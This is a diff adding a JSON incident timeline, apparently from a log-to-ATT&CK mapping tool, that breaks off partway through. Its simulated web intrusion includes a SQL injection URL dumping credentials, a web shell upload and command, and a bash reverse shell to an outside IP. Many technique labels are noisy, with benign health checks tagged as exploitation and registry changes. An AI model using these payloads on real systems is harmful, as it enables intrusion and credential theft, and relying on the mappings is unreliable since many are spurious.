@@ -1,0 +1,4592 @@
+{
+  "timeline": [
+    {
+      "index": 0,
+      "ts": "2026-10-06T09:58:00",
+      "host": "gw-check",
+      "user": "checker",
+      "process": "",
+      "parent_process": "",
+      "command_line": "GET /health HTTP/1.1 200",
+      "command_line_full": "GET /health HTTP/1.1 200",
+      "message": "GET /health HTTP/1.1 200",
+      "raw": {
+        "@timestamp": "2026-10-06T09:58:00Z",
+        "host.name": "gw-check",
+        "user.name": "checker",
+        "winlog.channel": "nginx",
+        "event.code": "access",
+        "process.name": "",
+        "process.parent.name": "",
+        "process.command_line": "",
+        "source.ip": "172.16.9.9",
+        "destination.ip": "10.20.0.10",
+        "message": "GET /health HTTP/1.1 200"
+      },
+      "techniques": [
+        {
+          "technique": "T1190",
+          "name": "Exploit Public-Facing Application",
+          "confidence": "medium",
+          "score": 1.0,
+          "source": "heuristic",
+          "evidence": "KB search match on: GET /health HTTP/1.1 200"
+        },
+        {
+          "technique": "T1112",
+          "name": "Modify Registry",
+          "confidence": "medium",
+          "score": 0.9970059965168873,
+          "source": "heuristic",
+          "evidence": "KB search match on: GET /health HTTP/1.1 200"
+        },
+        {
+          "technique": "T1059.001",
+          "name": "PowerShell",
+          "confidence": "medium",
+          "score": 0.7315900231926635,
+          "source": "heuristic",
+          "evidence": "KB search match on: GET /health HTTP/1.1 200"
+        },
+        {
+          "technique": "T1685",
+          "name": "Disable or Modify Tools",
+          "confidence": "medium",
+          "score": 0.5088509093256618,
+          "source": "heuristic",
+          "evidence": "KB search match on: GET /health HTTP/1.1 200"
+        },
+        {
+          "technique": "T1574.001",
+          "name": "DLL",
+          "confidence": "medium",
+          "score": 0.49930759167481054,
+          "source": "heuristic",
+          "evidence": "KB search match on: GET /health HTTP/1.1 200"
+        },
+        {
+          "technique": "T1218",
+          "name": "System Binary Proxy Execution",
+          "confidence": "medium",
+          "score": 0.48586605523874615,
+          "source": "heuristic",
+          "evidence": "KB search match on: GET /health HTTP/1.1 200"
+        },
+        {
+          "technique": "T1003.001",
+          "name": "LSASS Memory",
+          "confidence": "low",
+          "score": 0.4415694891384807,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1105",
+          "name": "Ingress Tool Transfer",
+          "confidence": "low",
+          "score": 0.4199735168616212,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1027",
+          "name": "Obfuscated Files or Information",
+          "confidence": "low",
+          "score": 0.33061268777263253,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1204.002",
+          "name": "Malicious File",
+          "confidence": "low",
+          "score": 0.29886723264306864,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1082",
+          "name": "System Information Discovery",
+          "confidence": "low",
+          "score": 0.28513822935430655,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1059",
+          "name": "Command and Scripting Interpreter",
+          "confidence": "low",
+          "score": 0.25812315845455347,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1047",
+          "name": "Windows Management Instrumentation",
+          "confidence": "low",
+          "score": 0.21667298449350836,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1071.001",
+          "name": "Web Protocols",
+          "confidence": "low",
+          "score": 0.2139518318444719,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1218.011",
+          "name": "Rundll32",
+          "confidence": "low",
+          "score": 0.1811038962632405,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1059.003",
+          "name": "Windows Command Shell",
+          "confidence": "low",
+          "score": 0.17205875472421592,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1219.002",
+          "name": "Remote Desktop Software",
+          "confidence": "low",
+          "score": 0.1717314775653531,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1003",
+          "name": "OS Credential Dumping",
+          "confidence": "low",
+          "score": 0.1713822925903646,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1547.001",
+          "name": "Registry Run Keys / Startup Folder",
+          "confidence": "low",
+          "score": 0.1693847390106606,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1543.003",
+          "name": "Windows Service",
+          "confidence": "low",
+          "score": 0.1684818962673701,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        }
+      ],
+      "primary_technique": "T1190",
+      "primary_confidence": "medium",
+      "channel": "nginx",
+      "event_id": "access"
+    },
+    {
+      "index": 1,
+      "ts": "2026-10-06T10:00:12",
+      "host": "web01",
+      "user": "www-data",
+      "process": "",
+      "parent_process": "",
+      "command_line": "GET /products.php?id=1%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1 200 sqlmap/1.7",
+      "command_line_full": "GET /products.php?id=1%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1 200 sqlmap/1.7",
+      "message": "GET /products.php?id=1%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1 200 sqlmap/1.7",
+      "raw": {
+        "@timestamp": "2026-10-06T10:00:12Z",
+        "host.name": "web01",
+        "user.name": "www-data",
+        "winlog.channel": "nginx",
+        "event.code": "access",
+        "process.name": "",
+        "process.parent.name": "",
+        "process.command_line": "",
+        "source.ip": "185.220.101.44",
+        "destination.ip": "10.20.0.10",
+        "message": "GET /products.php?id=1%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1 200 sqlmap/1.7"
+      },
+      "techniques": [
+        {
+          "technique": "T1190",
+          "name": "Exploit Public-Facing Application",
+          "confidence": "high",
+          "score": 1.0,
+          "source": "heuristic",
+          "evidence": "KB search match on: GET /products.php?id=1%20UNION%20SELECT%20username..."
+        },
+        {
+          "technique": "T1112",
+          "name": "Modify Registry",
+          "confidence": "medium",
+          "score": 0.19623691216991188,
+          "source": "heuristic",
+          "evidence": "KB search match on: GET /products.php?id=1%20UNION%20SELECT%20username..."
+        },
+        {
+          "technique": "T1059.001",
+          "name": "PowerShell",
+          "confidence": "medium",
+          "score": 0.1362131236230323,
+          "source": "heuristic",
+          "evidence": "KB search match on: GET /products.php?id=1%20UNION%20SELECT%20username..."
+        },
+        {
+          "technique": "T1685",
+          "name": "Disable or Modify Tools",
+          "confidence": "medium",
+          "score": 0.11081142741901012,
+          "source": "heuristic",
+          "evidence": "KB search match on: GET /products.php?id=1%20UNION%20SELECT%20username..."
+        },
+        {
+          "technique": "T1574.001",
+          "name": "DLL",
+          "confidence": "medium",
+          "score": 0.09906167685466355,
+          "source": "heuristic",
+          "evidence": "KB search match on: GET /products.php?id=1%20UNION%20SELECT%20username..."
+        },
+        {
+          "technique": "T1218",
+          "name": "System Binary Proxy Execution",
+          "confidence": "medium",
+          "score": 0.08715483893140868,
+          "source": "heuristic",
+          "evidence": "KB search match on: GET /products.php?id=1%20UNION%20SELECT%20username..."
+        },
+        {
+          "technique": "T1105",
+          "name": "Ingress Tool Transfer",
+          "confidence": "medium",
+          "score": 0.07217514439697058,
+          "source": "heuristic",
+          "evidence": "KB search match on: GET /products.php?id=1%20UNION%20SELECT%20username..."
+        },
+        {
+          "technique": "T1059",
+          "name": "Command and Scripting Interpreter",
+          "confidence": "medium",
+          "score": 0.062037157515912586,
+          "source": "heuristic",
+          "evidence": "KB search match on: GET /products.php?id=1%20UNION%20SELECT%20username..."
+        },
+        {
+          "technique": "T1027",
+          "name": "Obfuscated Files or Information",
+          "confidence": "medium",
+          "score": 0.05264577820439017,
+          "source": "heuristic",
+          "evidence": "KB search match on: GET /products.php?id=1%20UNION%20SELECT%20username..."
+        },
+        {
+          "technique": "T1047",
+          "name": "Windows Management Instrumentation",
+          "confidence": "medium",
+          "score": 0.05239418943356826,
+          "source": "heuristic",
+          "evidence": "KB search match on: GET /products.php?id=1%20UNION%20SELECT%20username..."
+        },
+        {
+          "technique": "T1003.001",
+          "name": "LSASS Memory",
+          "confidence": "medium",
+          "score": 0.050635113733232165,
+          "source": "heuristic",
+          "evidence": "KB search match on: GET /products.php?id=1%20UNION%20SELECT%20username..."
+        },
+        {
+          "technique": "T1055",
+          "name": "Process Injection",
+          "confidence": "medium",
+          "score": 0.04587080917918138,
+          "source": "heuristic",
+          "evidence": "KB search match on: GET /products.php?id=1%20UNION%20SELECT%20username..."
+        },
+        {
+          "technique": "T1204.002",
+          "name": "Malicious File",
+          "confidence": "low",
+          "score": 0.056327802689094646,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1098",
+          "name": "Account Manipulation",
+          "confidence": "low",
+          "score": 0.0463552617350681,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1560.001",
+          "name": "Archive via Utility",
+          "confidence": "low",
+          "score": 0.04578792523065026,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1082",
+          "name": "System Information Discovery",
+          "confidence": "low",
+          "score": 0.04405222549555154,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1003",
+          "name": "OS Credential Dumping",
+          "confidence": "low",
+          "score": 0.04134449422269186,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1547.001",
+          "name": "Registry Run Keys / Startup Folder",
+          "confidence": "low",
+          "score": 0.04050118109656669,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1053.005",
+          "name": "Scheduled Task",
+          "confidence": "low",
+          "score": 0.0387696242282823,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1218.011",
+          "name": "Rundll32",
+          "confidence": "low",
+          "score": 0.03856344606075497,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        }
+      ],
+      "primary_technique": "T1190",
+      "primary_confidence": "high",
+      "channel": "nginx",
+      "event_id": "access"
+    },
+    {
+      "index": 2,
+      "ts": "2026-10-06T10:01:40",
+      "host": "web01",
+      "user": "www-data",
+      "process": "",
+      "parent_process": "",
+      "command_line": "POST /admin/upload.php HTTP/1.1 200 filename=shell.php",
+      "command_line_full": "POST /admin/upload.php HTTP/1.1 200 filename=shell.php",
+      "message": "POST /admin/upload.php HTTP/1.1 200 filename=shell.php",
+      "raw": {
+        "@timestamp": "2026-10-06T10:01:40Z",
+        "host.name": "web01",
+        "user.name": "www-data",
+        "winlog.channel": "nginx",
+        "event.code": "access",
+        "process.name": "",
+        "process.parent.name": "",
+        "process.command_line": "",
+        "source.ip": "185.220.101.44",
+        "destination.ip": "10.20.0.10",
+        "message": "POST /admin/upload.php HTTP/1.1 200 filename=shell.php"
+      },
+      "techniques": [
+        {
+          "technique": "T1505.003",
+          "name": "Web Shell",
+          "confidence": "high",
+          "score": 1.0,
+          "source": "heuristic",
+          "evidence": "KB search match on: POST /admin/upload.php HTTP/1.1 200 filename=shell..."
+        },
+        {
+          "technique": "T1190",
+          "name": "Exploit Public-Facing Application",
+          "confidence": "medium",
+          "score": 0.16890469627184904,
+          "source": "heuristic",
+          "evidence": "KB search match on: POST /admin/upload.php HTTP/1.1 200 filename=shell..."
+        },
+        {
+          "technique": "T1112",
+          "name": "Modify Registry",
+          "confidence": "medium",
+          "score": 0.12012080868735238,
+          "source": "heuristic",
+          "evidence": "KB search match on: POST /admin/upload.php HTTP/1.1 200 filename=shell..."
+        },
+        {
+          "technique": "T1059.001",
+          "name": "PowerShell",
+          "confidence": "medium",
+          "score": 0.08800846191349923,
+          "source": "heuristic",
+          "evidence": "KB search match on: POST /admin/upload.php HTTP/1.1 200 filename=shell..."
+        },
+        {
+          "technique": "T1059",
+          "name": "Command and Scripting Interpreter",
+          "confidence": "medium",
+          "score": 0.07538998894067044,
+          "source": "heuristic",
+          "evidence": "KB search match on: POST /admin/upload.php HTTP/1.1 200 filename=shell..."
+        },
+        {
+          "technique": "T1218",
+          "name": "System Binary Proxy Execution",
+          "confidence": "medium",
+          "score": 0.0625847973815969,
+          "source": "heuristic",
+          "evidence": "KB search match on: POST /admin/upload.php HTTP/1.1 200 filename=shell..."
+        },
+        {
+          "technique": "T1105",
+          "name": "Ingress Tool Transfer",
+          "confidence": "medium",
+          "score": 0.05870017261791701,
+          "source": "heuristic",
+          "evidence": "KB search match on: POST /admin/upload.php HTTP/1.1 200 filename=shell..."
+        },
+        {
+          "technique": "T1574.001",
+          "name": "DLL",
+          "confidence": "medium",
+          "score": 0.057994850707891454,
+          "source": "heuristic",
+          "evidence": "KB search match on: POST /admin/upload.php HTTP/1.1 200 filename=shell..."
+        },
+        {
+          "technique": "T1685",
+          "name": "Disable or Modify Tools",
+          "confidence": "medium",
+          "score": 0.05659867306965253,
+          "source": "heuristic",
+          "evidence": "KB search match on: POST /admin/upload.php HTTP/1.1 200 filename=shell..."
+        },
+        {
+          "technique": "T1027",
+          "name": "Obfuscated Files or Information",
+          "confidence": "low",
+          "score": 0.0765680237151404,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1003.001",
+          "name": "LSASS Memory",
+          "confidence": "low",
+          "score": 0.07139118060744218,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1552.001",
+          "name": "Credentials In Files",
+          "confidence": "low",
+          "score": 0.055454755635697524,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1204.002",
+          "name": "Malicious File",
+          "confidence": "low",
+          "score": 0.05343055777642943,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1059.004",
+          "name": "Unix Shell",
+          "confidence": "low",
+          "score": 0.04946038821246844,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1059.003",
+          "name": "Windows Command Shell",
+          "confidence": "low",
+          "score": 0.043495233136357295,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1547.001",
+          "name": "Registry Run Keys / Startup Folder",
+          "confidence": "low",
+          "score": 0.04081791033352774,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1003",
+          "name": "OS Credential Dumping",
+          "confidence": "low",
+          "score": 0.03546391302575321,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1560.001",
+          "name": "Archive via Utility",
+          "confidence": "low",
+          "score": 0.034491736425364905,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1071.001",
+          "name": "Web Protocols",
+          "confidence": "low",
+          "score": 0.03422097902817929,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1021.002",
+          "name": "SMB/Windows Admin Shares",
+          "confidence": "low",
+          "score": 0.03406644243009416,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        }
+      ],
+      "primary_technique": "T1505.003",
+      "primary_confidence": "high",
+      "channel": "nginx",
+      "event_id": "access"
+    },
+    {
+      "index": 3,
+      "ts": "2026-10-06T10:02:05",
+      "host": "web01",
+      "user": "www-data",
+      "process": "",
+      "parent_process": "",
+      "command_line": "GET /uploads/shell.php?cmd=id HTTP/1.1 200",
+      "command_line_full": "GET /uploads/shell.php?cmd=id HTTP/1.1 200",
+      "message": "GET /uploads/shell.php?cmd=id HTTP/1.1 200",
+      "raw": {
+        "@timestamp": "2026-10-06T10:02:05Z",
+        "host.name": "web01",
+        "user.name": "www-data",
+        "winlog.channel": "nginx",
+        "event.code": "access",
+        "process.name": "",
+        "process.parent.name": "",
+        "process.command_line": "",
+        "source.ip": "185.220.101.44",
+        "destination.ip": "10.20.0.10",
+        "message": "GET /uploads/shell.php?cmd=id HTTP/1.1 200"
+      },
+      "techniques": [
+        {
+          "technique": "T1190",
+          "name": "Exploit Public-Facing Application",
+          "confidence": "medium",
+          "score": 1.0,
+          "source": "heuristic",
+          "evidence": "KB search match on: GET /uploads/shell.php?cmd=id HTTP/1.1 200"
+        },
+        {
+          "technique": "T1112",
+          "name": "Modify Registry",
+          "confidence": "medium",
+          "score": 0.9340495967396054,
+          "source": "heuristic",
+          "evidence": "KB search match on: GET /uploads/shell.php?cmd=id HTTP/1.1 200"
+        },
+        {
+          "technique": "T1059.001",
+          "name": "PowerShell",
+          "confidence": "medium",
+          "score": 0.8219927003267422,
+          "source": "heuristic",
+          "evidence": "KB search match on: GET /uploads/shell.php?cmd=id HTTP/1.1 200"
+        },
+        {
+          "technique": "T1059",
+          "name": "Command and Scripting Interpreter",
+          "confidence": "medium",
+          "score": 0.5501735516242301,
+          "source": "heuristic",
+          "evidence": "KB search match on: GET /uploads/shell.php?cmd=id HTTP/1.1 200"
+        },
+        {
+          "technique": "T1685",
+          "name": "Disable or Modify Tools",
+          "confidence": "medium",
+          "score": 0.5454632232369245,
+          "source": "heuristic",
+          "evidence": "KB search match on: GET /uploads/shell.php?cmd=id HTTP/1.1 200"
+        },
+        {
+          "technique": "T1218",
+          "name": "System Binary Proxy Execution",
+          "confidence": "medium",
+          "score": 0.48303746409213677,
+          "source": "heuristic",
+          "evidence": "KB search match on: GET /uploads/shell.php?cmd=id HTTP/1.1 200"
+        },
+        {
+          "technique": "T1105",
+          "name": "Ingress Tool Transfer",
+          "confidence": "medium",
+          "score": 0.46084686178694284,
+          "source": "heuristic",
+          "evidence": "KB search match on: GET /uploads/shell.php?cmd=id HTTP/1.1 200"
+        },
+        {
+          "technique": "T1574.001",
+          "name": "DLL",
+          "confidence": "medium",
+          "score": 0.4340197564547877,
+          "source": "heuristic",
+          "evidence": "KB search match on: GET /uploads/shell.php?cmd=id HTTP/1.1 200"
+        },
+        {
+          "technique": "T1027",
+          "name": "Obfuscated Files or Information",
+          "confidence": "medium",
+          "score": 0.38210842065792655,
+          "source": "heuristic",
+          "evidence": "KB search match on: GET /uploads/shell.php?cmd=id HTTP/1.1 200"
+        },
+        {
+          "technique": "T1003.001",
+          "name": "LSASS Memory",
+          "confidence": "low",
+          "score": 0.36805756512944504,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1059.003",
+          "name": "Windows Command Shell",
+          "confidence": "low",
+          "score": 0.31313919847504273,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1059.004",
+          "name": "Unix Shell",
+          "confidence": "low",
+          "score": 0.29570798898893325,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1204.002",
+          "name": "Malicious File",
+          "confidence": "low",
+          "score": 0.2851131318860282,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1505.003",
+          "name": "Web Shell",
+          "confidence": "low",
+          "score": 0.26222843902195514,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1082",
+          "name": "System Information Discovery",
+          "confidence": "low",
+          "score": 0.22696698628948392,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1547.001",
+          "name": "Registry Run Keys / Startup Folder",
+          "confidence": "low",
+          "score": 0.22063464625130763,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1053.005",
+          "name": "Scheduled Task",
+          "confidence": "low",
+          "score": 0.21067942269974996,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1560.001",
+          "name": "Archive via Utility",
+          "confidence": "low",
+          "score": 0.18643953114260317,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1071.001",
+          "name": "Web Protocols",
+          "confidence": "low",
+          "score": 0.18583495847541995,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1555.003",
+          "name": "Credentials from Web Browsers",
+          "confidence": "low",
+          "score": 0.17721616682908245,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        }
+      ],
+      "primary_technique": "T1190",
+      "primary_confidence": "medium",
+      "channel": "nginx",
+      "event_id": "access"
+    },
+    {
+      "index": 4,
+      "ts": "2026-10-06T10:03:00",
+      "host": "gw-check",
+      "user": "checker",
+      "process": "",
+      "parent_process": "",
+      "command_line": "GET /health HTTP/1.1 200",
+      "command_line_full": "GET /health HTTP/1.1 200",
+      "message": "GET /health HTTP/1.1 200",
+      "raw": {
+        "@timestamp": "2026-10-06T10:03:00Z",
+        "host.name": "gw-check",
+        "user.name": "checker",
+        "winlog.channel": "nginx",
+        "event.code": "access",
+        "process.name": "",
+        "process.parent.name": "",
+        "process.command_line": "",
+        "source.ip": "172.16.9.9",
+        "destination.ip": "10.20.0.10",
+        "message": "GET /health HTTP/1.1 200"
+      },
+      "techniques": [
+        {
+          "technique": "T1190",
+          "name": "Exploit Public-Facing Application",
+          "confidence": "medium",
+          "score": 1.0,
+          "source": "heuristic",
+          "evidence": "KB search match on: GET /health HTTP/1.1 200"
+        },
+        {
+          "technique": "T1112",
+          "name": "Modify Registry",
+          "confidence": "medium",
+          "score": 0.9970059965168873,
+          "source": "heuristic",
+          "evidence": "KB search match on: GET /health HTTP/1.1 200"
+        },
+        {
+          "technique": "T1059.001",
+          "name": "PowerShell",
+          "confidence": "medium",
+          "score": 0.7315900231926635,
+          "source": "heuristic",
+          "evidence": "KB search match on: GET /health HTTP/1.1 200"
+        },
+        {
+          "technique": "T1685",
+          "name": "Disable or Modify Tools",
+          "confidence": "medium",
+          "score": 0.5088509093256618,
+          "source": "heuristic",
+          "evidence": "KB search match on: GET /health HTTP/1.1 200"
+        },
+        {
+          "technique": "T1574.001",
+          "name": "DLL",
+          "confidence": "medium",
+          "score": 0.49930759167481054,
+          "source": "heuristic",
+          "evidence": "KB search match on: GET /health HTTP/1.1 200"
+        },
+        {
+          "technique": "T1218",
+          "name": "System Binary Proxy Execution",
+          "confidence": "medium",
+          "score": 0.48586605523874615,
+          "source": "heuristic",
+          "evidence": "KB search match on: GET /health HTTP/1.1 200"
+        },
+        {
+          "technique": "T1105",
+          "name": "Ingress Tool Transfer",
+          "confidence": "low",
+          "score": 0.4199735168616212,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1003.001",
+          "name": "LSASS Memory",
+          "confidence": "low",
+          "score": 0.40250671412258304,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1027",
+          "name": "Obfuscated Files or Information",
+          "confidence": "low",
+          "score": 0.33061268777263253,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1204.002",
+          "name": "Malicious File",
+          "confidence": "low",
+          "score": 0.29886723264306864,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1082",
+          "name": "System Information Discovery",
+          "confidence": "low",
+          "score": 0.28513822935430655,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1059",
+          "name": "Command and Scripting Interpreter",
+          "confidence": "low",
+          "score": 0.25812315845455347,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1047",
+          "name": "Windows Management Instrumentation",
+          "confidence": "low",
+          "score": 0.21667298449350836,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1071.001",
+          "name": "Web Protocols",
+          "confidence": "low",
+          "score": 0.2139518318444719,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1218.011",
+          "name": "Rundll32",
+          "confidence": "low",
+          "score": 0.1811038962632405,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1059.003",
+          "name": "Windows Command Shell",
+          "confidence": "low",
+          "score": 0.17205875472421592,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1219.002",
+          "name": "Remote Desktop Software",
+          "confidence": "low",
+          "score": 0.1717314775653531,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1003",
+          "name": "OS Credential Dumping",
+          "confidence": "low",
+          "score": 0.1713822925903646,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1547.001",
+          "name": "Registry Run Keys / Startup Folder",
+          "confidence": "low",
+          "score": 0.1693847390106606,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1543.003",
+          "name": "Windows Service",
+          "confidence": "low",
+          "score": 0.1684818962673701,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        }
+      ],
+      "primary_technique": "T1190",
+      "primary_confidence": "medium",
+      "channel": "nginx",
+      "event_id": "access"
+    },
+    {
+      "index": 5,
+      "ts": "2026-10-06T10:03:20",
+      "host": "web01",
+      "user": "www-data",
+      "process": "bash",
+      "parent_process": "sh",
+      "command_line": "bash -i >& /dev/tcp/185.220.101.44/4444 0>&1",
+      "command_line_full": "bash -i >& /dev/tcp/185.220.101.44/4444 0>&1",
+      "message": "reverse shell spawned from webshell",
+      "raw": {
+        "@timestamp": "2026-10-06T10:03:20Z",
+        "host.name": "web01",
+        "user.name": "www-data",
+        "winlog.channel": "auditd",
+        "event.code": "execve",
+        "process.name": "bash",
+        "process.parent.name": "sh",
+        "process.command_line": "bash -i >& /dev/tcp/185.220.101.44/4444 0>&1",
+        "source.ip": "",
+        "destination.ip": "",
+        "message": "reverse shell spawned from webshell"
+      },
+      "techniques": [
+        {
+          "technique": "T1059.004",
+          "name": "Unix Shell",
+          "confidence": "high",
+          "score": 1.0,
+          "source": "heuristic",
+          "evidence": "KB search match on: bash -i >& /dev/tcp/185.220.101.44/4444 0>&1"
+        },
+        {
+          "technique": "T1112",
+          "name": "Modify Registry",
+          "confidence": "medium",
+          "score": 0.08881801833758428,
+          "source": "heuristic",
+          "evidence": "KB search match on: bash -i >& /dev/tcp/185.220.101.44/4444 0>&1"
+        },
+        {
+          "technique": "T1685",
+          "name": "Disable or Modify Tools",
+          "confidence": "medium",
+          "score": 0.0862409103209716,
+          "source": "heuristic",
+          "evidence": "KB search match on: bash -i >& /dev/tcp/185.220.101.44/4444 0>&1"
+        },
+        {
+          "technique": "T1059.001",
+          "name": "PowerShell",
+          "confidence": "medium",
+          "score": 0.07758230815262042,
+          "source": "heuristic",
+          "evidence": "KB search match on: bash -i >& /dev/tcp/185.220.101.44/4444 0>&1"
+        },
+        {
+          "technique": "T1027",
+          "name": "Obfuscated Files or Information",
+          "confidence": "medium",
+          "score": 0.058046775756993574,
+          "source": "heuristic",
+          "evidence": "KB search match on: bash -i >& /dev/tcp/185.220.101.44/4444 0>&1"
+        },
+        {
+          "technique": "T1059",
+          "name": "Command and Scripting Interpreter",
+          "confidence": "low",
+          "score": 0.1000574863018147,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1190",
+          "name": "Exploit Public-Facing Application",
+          "confidence": "low",
+          "score": 0.06836918173548745,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1218",
+          "name": "System Binary Proxy Execution",
+          "confidence": "low",
+          "score": 0.06134602130386249,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1505.003",
+          "name": "Web Shell",
+          "confidence": "low",
+          "score": 0.0601193839684687,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1572",
+          "name": "Protocol Tunneling",
+          "confidence": "low",
+          "score": 0.049655661807331844,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1105",
+          "name": "Ingress Tool Transfer",
+          "confidence": "low",
+          "score": 0.04931093842136076,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1140",
+          "name": "Deobfuscate/Decode Files or Information",
+          "confidence": "low",
+          "score": 0.04577967782334742,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1070.003",
+          "name": "Clear Command History",
+          "confidence": "low",
+          "score": 0.04100409655203228,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1059.003",
+          "name": "Windows Command Shell",
+          "confidence": "low",
+          "score": 0.038390133320474945,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1574.001",
+          "name": "DLL",
+          "confidence": "low",
+          "score": 0.03711720384375409,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1560.001",
+          "name": "Archive via Utility",
+          "confidence": "low",
+          "score": 0.0320405238826332,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1546.005",
+          "name": "Trap",
+          "confidence": "low",
+          "score": 0.031808129818503034,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1204.002",
+          "name": "Malicious File",
+          "confidence": "low",
+          "score": 0.02781077509087048,
+          "source": "blob_search",
+          "evidence": "KB search match on full row blob"
+        },
+        {
+          "technique": "T1003.001",
+          "name": "LSASS Memory",
+          "confidence": "low",
+          "score": 0.027771362253321642,
+          "source": "blob_search",
